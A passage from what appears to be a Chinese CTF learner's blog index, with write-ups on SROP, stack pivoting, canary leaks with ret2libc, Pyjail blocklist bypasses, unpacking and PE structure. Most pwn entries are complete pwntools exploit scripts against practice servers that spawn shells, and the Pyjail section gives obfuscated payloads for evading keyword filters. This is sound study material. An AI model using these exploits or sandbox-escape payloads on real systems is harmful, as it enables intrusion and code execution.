(SYS_execve)&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;RDI = <span class="subst">&#123;<span class="built_in">hex</span>(frame.rdi)&#125;</span> (global_buf + <span class="subst">&#123;BIN_SH_OFFSET&#125;</span>)&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;RIP = <span class="subst">&#123;<span class="built_in">hex</span>(frame.rip)&#125;</span> (syscall)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造攻击载荷</span></span><br><span class="line">    payload = <span class="built_in">bytes</span>(frame)</span><br><span class="line">    padding = <span class="string">b&#x27;A&#x27;</span> * (BIN_SH_OFFSET - <span class="built_in">len</span>(payload))</span><br><span class="line">    bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    </span><br><span class="line">    full_payload = payload + padding + bin_sh</span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">f&quot;载荷长度: <span class="subst">&#123;<span class="built_in">len</span>(full_payload)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;帧数据: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;填充数据: <span class="subst">&#123;<span class="built_in">len</span>(padding)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;字符串数据: <span class="subst">&#123;<span class="built_in">len</span>(bin_sh)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送载荷</span></span><br><span class="line">    p.send(full_payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 切换到交互模式</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>SROP</category>
      </categories>
  </entry>
  <entry>
    <title>[ZJCTF 2019]Login(c++)</title>
    <url>/2025/03/11/ZJCTF-2019-Login-c/</url>
    <content><![CDATA[<p>这题有点难度(我根本找不到漏洞，如果没有看wp，嘻嘻)</p>
<ol>
<li><p>直接看漏洞所在地</p>
<p><img src="/2025/03/11/ZJCTF-2019-Login-c/1.png" alt="1"></p>
</li>
<li><p>所以我们只要把rax的值改成backdoor函数就可以了 </p>
</li>
<li><p>可以看到给rax赋值的是var_18</p>
<p><img src="/2025/03/11/ZJCTF-2019-Login-c/2.png" alt="2"></p>
</li>
<li><p>算一下偏移</p>
<p><img src="/2025/03/11/ZJCTF-2019-Login-c/3.png" alt="3"></p>
</li>
</ol>
<p>​       还要减去密码的长度 0x48 - 0x0f &#x3D; 0x3a</p>
<ol start="5">
<li><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25722</span>)</span><br><span class="line">backdoor = <span class="number">0x400e88</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span>+ <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x3a</span> + p64(backdoor)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>misc学习记录</title>
    <url>/2025/03/06/Pyjail/</url>
    <content><![CDATA[<h1 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail"></a>Pyjail</h1><h2 id="Pyjail1"><a href="#Pyjail1" class="headerlink" title="Pyjail1"></a>Pyjail1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;Give me your code: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 过滤关键字</span></span><br><span class="line">    forbidden_keywords = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords:</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> user_input:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Forbidden keyword detected: <span class="subst">&#123;keyword&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    result = <span class="built_in">eval</span>(user_input)</span><br></pre></td></tr></table></figure>

<p>禁用了[‘import’, ‘eval’, ‘exec’, ‘open’, ‘file’]</p>
<p>Payload1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;print(getattr(__builtins__, &#x27;__imp&#x27;+&#x27;ort__&#x27;)(&#x27;os&#x27;).listdir(&#x27;/tmp&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>执行系统命令来列出&#x2F;tmp目录下的文件。</p>
<p><code>&#39;__imp&#39; + &#39;ort__&#39;</code> 拼接后形成 <code>&#39;__import__&#39;</code>，但代码检查时不会检测到完整的<code>&#39;import&#39;</code>字符串</p>
<p><code>getattr(__builtins__, &#39;__imp&#39;+&#39;ort__&#39;)</code> 的作用是：</p>
<ul>
<li><code>__builtins__</code> 是Python的一个内置模块，包含了所有内置函数和变量</li>
<li><code>getattr(object, name)</code> 函数返回对象的命名属性的值</li>
<li>这里我们获取 <code>__builtins__</code> 模块中的 <code>__import__</code> 函数</li>
</ul>
<p><code>(&#39;os&#39;)</code> 部分：</p>
<ul>
<li>调用获取到的 <code>__import__</code> 函数，参数为 <code>&#39;os&#39;</code></li>
<li>这相当于执行了 <code>import os</code>，但绕过了对<code>import</code>关键字的直接检查</li>
</ul>
<p><code>.listdir(&#39;/tmp&#39;)</code> 部分：</p>
<ul>
<li>调用导入的<code>os</code>模块的<code>listdir</code>方法</li>
<li><code>listdir(&#39;/tmp&#39;)</code> 会列出<code>/tmp</code>目录下的所有文件和文件夹</li>
</ul>
<p>Payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(getattr(__builtins__, &#x27;o&#x27;+&#x27;pen&#x27;)(&#x27;/tmp/flag.txt&#x27;).read())</span><br></pre></td></tr></table></figure>

<p><code>.read()</code> 部分：</p>
<ul>
<li>调用文件对象的 <code>read</code> 方法</li>
<li>这会读取文件的全部内容，并返回一个字符串</li>
</ul>
<h2 id="Pyjail2"><a href="#Pyjail2" class="headerlink" title="Pyjail2"></a>Pyjail2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;Give me your code: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 过滤关键字</span></span><br><span class="line">    forbidden_keywords = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> forbidden_keywords:</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> user_input:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Forbidden keyword detected: <span class="subst">&#123;keyword&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 过滤特殊字符</span></span><br><span class="line">    forbidden_chars = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> forbidden_chars:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> user_input:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Forbidden character detected: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">eval</span>(user_input)</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(getattr(getattr(getattr(globals(),chr(103)+chr(101)+chr(116))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)),chr(111)+chr(112)+chr(101)+chr(110))(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))())</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>禁止关键字</strong>：<code>import</code>, <code>eval</code>, <code>exec</code>, <code>open</code>, <code>file</code></li>
<li><strong>禁止字符</strong>：<code>.</code>, <code>_</code>, <code>[</code>, <code>]</code>, <code>&#39;</code>, <code>&quot;</code></li>
</ul>
<p>解题思路</p>
<p>由于直接使用<code>open</code>函数和点号访问属性被禁止，我们需要绕过过滤：</p>
<ol>
<li>使用<code>chr()</code>函数通过ASCII码构造字符串，避免使用禁止字符。</li>
<li>使用<code>getattr()</code>函数通过字符串名称访问属性和方法，避免使用点号。</li>
<li>通过<code>globals()</code>和<code>__builtins__</code>间接获取<code>open</code>函数。</li>
<li>最终调用<code>open(&#39;/tmp/flag.txt&#39;).read()</code>读取文件内容，并用<code>print</code>确保输出。</li>
</ol>
]]></content>
      <categories>
        <category>MISC</category>
        <category>Pyjail</category>
      </categories>
  </entry>
  <entry>
    <title>ESP定律脱壳</title>
    <url>/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<p>先用dbg打开，F8步入发现第一个esp发生变化(除了载入时第一次变红)在ESP硬件下断点。</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/0.png" alt="0"></p>
<p>F9达到jne，继续F8，ret后面返回的就是oep的入口。</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/1.png" alt="1"></p>
<p>oep的入口</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/2.png" alt="2"></p>
<p>在这里dump就可以了</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/3.png" alt="3"></p>
<p>把第一步转储的修复</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/4.png" alt="4"></p>
<p>生成00.aspack_dump_SCY.exe用IDA打开就是脱壳了的。</p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
      </categories>
  </entry>
  <entry>
    <title>ciscn_2019_es_2(栈迁移)</title>
    <url>/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>碰到一个栈迁移的题目仔细记录一下</p>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><ol>
<li>先用IDA打开<br><img src="/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/1.png" alt="1"></li>
</ol>
<p>​       但是它有两个read,于是我们可以利用第一个泄露ebp的内容，利用第二个进行栈迁移，通过system函数执行&#x2F;bin&#x2F;sh</p>
<pre><code> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node5.buuoj.cn&quot;, 25271)</span></span><br><span class="line">payload1= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> </span><br><span class="line">r.send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
</code></pre>
<p>​     2. 动态调试找到s到ebp的距离，先在main的nop下断点</p>
<p><img src="/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/2.png" alt="2"></p>
<p>  <img src="/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/3.png" alt="3"></p>
<p>   <img src="/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/4.png" alt="4"></p>
<p>s和ebp的距离是0x38</p>
<p><img src="/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/5.png" alt="5"></p>
<p>当恢复ebp的备份时，这个备份恰好比原来多了0x10</p>
<ol start="3">
<li><p>栈偏移一般用leave和ret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave:</span><br><span class="line">move esp ebp  将ebp指向的地址给esp</span><br><span class="line">pop ebp  将esp指向的地址存放的值赋值给ebp</span><br><span class="line">ret:</span><br><span class="line">pop eip  将esp指向的地址存放的值赋值给eip</span><br></pre></td></tr></table></figure>

<p>构造payload2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;aaaa&#x27;</span> <span class="comment">#如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节</span></span><br><span class="line">payload2 += p32(system)  <span class="comment">#接上system的地址</span></span><br><span class="line">payload2 += <span class="string">b&#x27;aaaa&#x27;</span> <span class="comment">#system的返回地址</span></span><br><span class="line">payload2 += p32(ebp_addr - <span class="number">0x38</span> + <span class="number">0x10</span>) <span class="comment"># /bin/sh的地址</span></span><br><span class="line">payload2 += <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充垃圾数据至0x28</span></span><br><span class="line">payload2 += p32(ebp_addr - <span class="number">0x38</span>)  <span class="comment">#填充成aaaa的地址</span></span><br><span class="line">payload2 += p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>可以用ROP获取leave_ret的地址<br><img src="/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/6.png" alt="6"></p>
</li>
</ol>
<p>​      完整exp<br>​  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27539</span>)</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">system = <span class="number">0x8048400</span></span><br><span class="line">payload1= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> </span><br><span class="line">r.send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">payload2 = <span class="string">b&#x27;aaaa&#x27;</span> <span class="comment">#如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节</span></span><br><span class="line">payload2 += p32(system)  <span class="comment">#接上system的地址</span></span><br><span class="line">payload2 += <span class="string">b&#x27;aaaa&#x27;</span> <span class="comment">#system的返回地址</span></span><br><span class="line">payload2 += p32(ebp_addr - <span class="number">0x38</span> + <span class="number">0x10</span>) <span class="comment"># /bin/sh的地址</span></span><br><span class="line">payload2 += <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充垃圾数据至0x28</span></span><br><span class="line">payload2 += p32(ebp_addr - <span class="number">0x38</span>)  <span class="comment">#填充成aaaa的地址</span></span><br><span class="line">payload2 += p32(leave_ret)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<p>得到flag<br><img src="/2025/02/15/ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB/7.png" alt="7"></p>
<h3 id="ciscn-s-4"><a href="#ciscn-s-4" class="headerlink" title="ciscn-s-4"></a>ciscn-s-4</h3><p>和ciscn_2019_es_2一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29440</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ciscn_s_4&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x8048400</span></span><br><span class="line">leave=<span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">buf=ebp-<span class="number">0x38</span> </span><br><span class="line">payload=(p32(sys_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(buf+<span class="number">12</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf-<span class="number">4</span>)+p32(leave)</span><br><span class="line">r.send(payload) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>buu_others_babystack(canary_puts)</title>
    <url>/2025/03/13/buu-others-babystack-canary-puts/</url>
    <content><![CDATA[<h3 id="一个算是综合点的题目"><a href="#一个算是综合点的题目" class="headerlink" title="一个算是综合点的题目"></a>一个算是综合点的题目</h3><ol>
<li><p>主要是为了记录这个泄露canary的模板</p>
</li>
<li><p>思路就是puts输出的时候利用栈溢出覆盖&#x2F;x00,让后面的canary泄露出来，然后在利用libc泄露完成此题(重点在泄露canary)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28050</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./babystack&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">offset = <span class="number">0x80</span>+<span class="number">8</span></span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">canary=u64(r.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露puts函数的got表地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#找到对应的libc版本</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算system函数和字符串‘/bin/sh’在程序里的实际地址</span></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rop攻击获取shell</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(canary)+p64(<span class="number">0</span>) + p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>参考博客</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/mcmuyanga/article/details/109776976</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>PE结构</title>
    <url>/2025/09/15/PE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h1><p>先贴一张结构图</p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/1.png" alt="1"></p>
<h2 id="PE-文件执行时-PE-装载器的操作流程"><a href="#PE-文件执行时-PE-装载器的操作流程" class="headerlink" title="PE 文件执行时 PE 装载器的操作流程"></a>PE 文件执行时 PE 装载器的操作流程</h2><ol>
<li>检查 DOS 头中 PE 头偏移，跳转至 PE 头位置.[E 文件被执行后，PE 装载器首先启动定位操作 —— 读取 DOS 头（DOS header）中记录的 PE 头（PE header）偏移量，确认该偏移位置后，直接跳转到 PE 头所在的内存地址，为后续验证 PE 头做准备。]</li>
<li>验证 PE 头有效性，跳转至 PE 头尾部[跳转至 PE 头后，PE 装载器进入验证环节：检查当前 PE 头的格式与标识是否符合规范（即判断 PE 头是否有效）。若验证通过，装载器会进一步跳转到 PE 头的尾部 —— 因 PE 头尾部与节表（Section Table）直接衔接，此跳转可快速衔接后续节表处理流程。]</li>
<li>读取节表信息，通过文件映射机制映射节段并设属性[PE 头尾部紧跟节表，装载器在完成 PE 头验证后，立即读取节表中的节段信息（如节段大小、位置等）；随后采用文件映射机制处理节段：Windows 不会一开始就将整个 PE 文件读入物理内存，仅由装载器建立虚拟地址与 PE 文件的映射关系，仅当需要执行某内存页指令或访问某页数据时，才将对应页面从磁盘提交到物理内存（该机制确保文件装入速度不受文件大小显著影响）；同时，装载器会根据节表中指定的规则，为映射到内存的节段设置对应的读写属性（如只读、可写、可执行等）。]</li>
<li>处理 PE 文件中的逻辑部分[待所有节段成功映射入内存后，PE 装载器进入后续逻辑处理阶段：针对 PE 文件中需动态关联的逻辑部分（典型如输入表 import table，用于关联外部函数与资源），继续执行解析、关联等操作，确保 PE 文件能正常调用外部资源，为最终执行指令奠定基础。]</li>
</ol>
<h2 id="分析一个程序"><a href="#分析一个程序" class="headerlink" title="分析一个程序"></a>分析一个程序</h2><p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/2.png" alt="1"></p>
<p>DOS头分成header和DOS存根。</p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/4.png" alt="1"></p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/3.png" alt="1"></p>
<p>如图2，e_lfanew指向PE头的位置。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/6.png" alt="1"></p>
<p>有两处被改动了</p>
<p>WZ –&gt;  MZ   90 –&gt;80再用IDA打开。</p>
<p><img src="/2025/09/15/PE%E7%BB%93%E6%9E%84/5.png" alt="1"></p>
<p>发现可以正常打开了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已知的 data 数组（37字节）</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设输入长度为 n，因为 data 有 n 字节，且最后是 &#125;</span></span><br><span class="line"><span class="comment"># 使用递推：input[i+1] = input[i] ^ i ^ data[i]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">start_char</span>):</span><br><span class="line">    inp = [<span class="number">0</span>] * n</span><br><span class="line">    inp[<span class="number">0</span>] = start_char</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        inp[i+<span class="number">1</span>] = inp[i] ^ i ^ data[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inp).decode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试常见 flag 开头</span></span><br><span class="line">candidates = [<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;F&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> candidates:</span><br><span class="line">    flag = recover_flag(<span class="built_in">ord</span>(c))</span><br><span class="line">    <span class="keyword">if</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;可能的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 额外检查是否合理</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&#x27;FLAG&#123;&#x27;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&#x27;ctf&#123;&#x27;</span> <span class="keyword">in</span> 